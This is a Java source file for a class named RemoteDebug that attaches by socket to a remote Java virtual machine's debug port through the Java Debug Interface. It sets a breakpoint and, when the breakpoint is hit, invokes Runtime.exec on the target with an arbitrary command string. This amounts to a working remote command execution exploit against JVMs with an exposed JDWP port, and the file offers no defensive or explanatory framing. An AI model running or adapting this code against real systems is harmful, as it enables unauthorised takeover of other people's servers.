import com.sun.jdi.*;
import com.sun.jdi.connect.*;
import com.sun.jdi.event.*;
import com.sun.jdi.request.*;

import java.util.*;

public class RemoteDebug {
	public VirtualMachine vm;
	private EventRequestManager erm;
	private String rhost;
	private String rport;
	private String bploc;
	
	public RemoteDebug(String rh, String rp, String bploc) {
		this.vm = null;
		this.erm = null;
		this.rhost = rh;
		this.rport = rp;
		this.bploc = bploc;
	}
	
	public void attach() throws Exception {
		VirtualMachineManager vmManager = Bootstrap.virtualMachineManager();
		AttachingConnector ac = null;
			 	
		for (AttachingConnector c: vmManager.attachingConnectors()) {
			if(c.name().equals("com.sun.jdi.SocketAttach")) {
				ac = c;
				break;
			}
		}
			 	
		if(ac == null)
			throw new RuntimeException("Unable to find Socket Attach Connector");
			 		
		Map<String,Connector.Argument> args = ac.defaultArguments();
		Connector.Argument h = args.get("hostname");
		Connector.Argument p = args.get("port");
			 	
		if(h == null || p == null)
			throw new RuntimeException("hostname or port connector argument not found");
			 	
		h.setValue(this.rhost);
		p.setValue(this.rport);
			 	
		this.vm = ac.attach(args);
		this.erm = this.vm.eventRequestManager();
	}
	
	public void exec(String cmd) throws Exception {
		assert this.vm != null;
		this.stopAndInvoke(cmd);
	}
	
	public ClassType findClass(String name) {
		return (ClassType) this.vm.classesByName(name).get(0);
	}
	public Method findMethod(String name, String sig) {
		String c = name.substring(0, name.lastIndexOf("."));
		String m = name.substring(name.lastIndexOf(".")+1, name.length());
		List<Method> ml = findClass(c).methodsByName(m);
		if(ml.size() != 1 && sig != null)
			return findClass(c).concreteMethodByName(m, sig);
		else
			return ml.get(0);
	}
		
	private void stopAndInvoke(String c) throws Exception {
		// insert bp
		insertBreakpoint(this.bploc, null);
			
		// catch bp, invoke, resume
		EventQueue eq = this.vm.eventQueue();
		EventSet eset = eq.remove();
		for (Event event : eset) {
			if (event instanceof VMDeathEvent || event instanceof VMDisconnectEvent) {
				System.out.println("Connection lost");
				return;
			}
			else if (event instanceof BreakpointEvent) {
				BreakpointEvent bpe = (BreakpointEvent) event;
				ThreadReference t = bpe.thread();
				
				ClassType rt = findClass("java.lang.Runtime");
				Method rtctor = findMethod("java.lang.Runtime.<init>", "()Ljava/lang/Runtime;");
				Method split = findMethod("java.lang.String.split", "(Ljava/lang/String;)[Ljava/lang/String;");
				Method exec = findMethod("java.lang.Runtime.exec", "([Ljava/lang/String;)Ljava/lang/Process;");
					
				// cmdarrayRef = cmdRef.split(" ")
				StringReference cmdRef = this.vm.mirrorOf(c);
				StringReference delimRef = this.vm.mirrorOf(" ");
				List<StringReference> splitargs = new LinkedList<StringReference>();
				splitargs.add(delimRef);
				ObjectReference cmdarrayRef = (ObjectReference) cmdRef.invokeMethod(t, split, splitargs, 0);
					
				// rtRef = new java.lang.Runtime()
				ObjectReference rtRef = rt.newInstance( t, rtctor, new LinkedList<ObjectReference>(), 0 );
				// processRef = rtRef.exec(cmdarray)
				List<ObjectReference> execargs = new LinkedList<ObjectReference>();
				execargs.add(cmdarrayRef);
				ObjectReference processRef = (ObjectReference) rtRef.invokeMethod(t, exec, execargs, 0);
				System.out.println(processRef);
			}
		}
		eset.resume();
	}
	
	private void insertBreakpoint(String name, String sig) {
		this.vm.suspend();
		Location loc = findMethod(name, sig).location();
		BreakpointRequest bpr = this.erm.createBreakpointRequest(loc);
		bpr.enable();
		this.vm.resume();
	}
	
}
